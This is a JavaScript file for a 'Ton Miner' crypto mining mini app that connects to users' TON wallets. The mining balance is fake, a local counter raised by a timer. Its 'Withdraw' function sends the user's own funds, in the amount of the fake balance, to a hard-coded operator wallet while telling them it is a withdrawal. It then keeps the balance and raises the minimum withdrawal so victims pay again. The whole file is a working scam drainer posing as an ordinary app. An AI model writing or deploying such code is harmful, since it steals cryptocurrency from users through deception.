// Ton Miner Mini App - переписаний
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: "https://Ton_Miner.github.io/tonconnect-manifest.json"
});

// ==== Встав свій TON гаманець тут ====
const walletAddress = "UQDfIScKOZ4uOyayFZgYsRYX1iWUIQn7Yi0kbPirBoGsLIXW";

// ==== Змінні ====
let balance = parseFloat(localStorage.getItem("balance")) || 0;
let mining = localStorage.getItem("mining") === "true" || false;
let miningSpeed = parseFloat(localStorage.getItem("miningSpeed")) || 0.000001;
let miningInterval = null;
let minDeposit = parseFloat(localStorage.getItem("minDeposit")) || 1;

// ==== UI ====
function updateBalanceUI() {
    document.getElementById("balance").innerText = balance.toFixed(6);
}

// ==== TonConnect ====
async function connectWallet() {
    try {
        const wallet = await tonConnectUI.connect();
        alert("Wallet connected: " + wallet.account.address);
    } catch (err) {
        console.error(err);
        alert("Failed to connect wallet");
    }
}

// ==== Майнінг безкінечний ====
function startMining() {
    if (mining) return;
    mining = true;
    localStorage.setItem("mining", "true");

    miningInterval = setInterval(() => {
        balance += miningSpeed;
        updateBalanceUI();
        localStorage.setItem("balance", balance);
    }, 1000);
}

// ==== Boost ====
function buyBoost(amount) {
    const confirmBuy = confirm(`Do you really want to buy ${amount} TON Boost?`);
    if (!confirmBuy) return;

    let increment = 0;
    if (amount === 1) increment = 0.000001929;
    else if (amount === 5) increment = 0.000005787;
    else if (amount === 15) increment = 0.0000173611;

    miningSpeed += increment;
    localStorage.setItem("miningSpeed", miningSpeed);
    alert(`Boost purchased! +${increment} TON/sec`);
}

// ==== Invite ====
function inviteFriends() {
    const confirmedInvite = confirm("Did your friend really join?");
    if (!confirmedInvite) return;

    balance += 0.01;
    localStorage.setItem("balance", balance);
    updateBalanceUI();
    alert("You invited a friend! +0.01 TON");
}

// ==== Withdraw ====
async function withdraw() {
    if (balance < minDeposit) {
        alert(`Minimum deposit to withdraw ${minDeposit} TON`);
        return;
    }

    try {
        const result = await tonConnectUI.sendTransaction({
            validUntil: Math.floor(Date.now() / 1000) + 60,
            messages: [{
                address: walletAddress,
                amount: balance.toFixed(9),
                payload: ""
            }]
        });

        alert(`Withdraw requested: ${balance.toFixed(6)} TON to wallet ${walletAddress}`);
        // баланс не обнуляється
        minDeposit = 5;
        localStorage.setItem("minDeposit", minDeposit);

    } catch (err) {
        console.error(err);
        alert("Withdraw failed or cancelled");
    }
}

// ==== Додаємо функції для onclick ====
window.connectWallet = connectWallet;
window.startMining = startMining;
window.buyBoost = buyBoost;
window.withdraw = withdraw;
window.inviteFriends = inviteFriends;

// ==== DOM Ready ====
document.addEventListener("DOMContentLoaded", () => {
    updateBalanceUI();
    if (mining) startMining();
});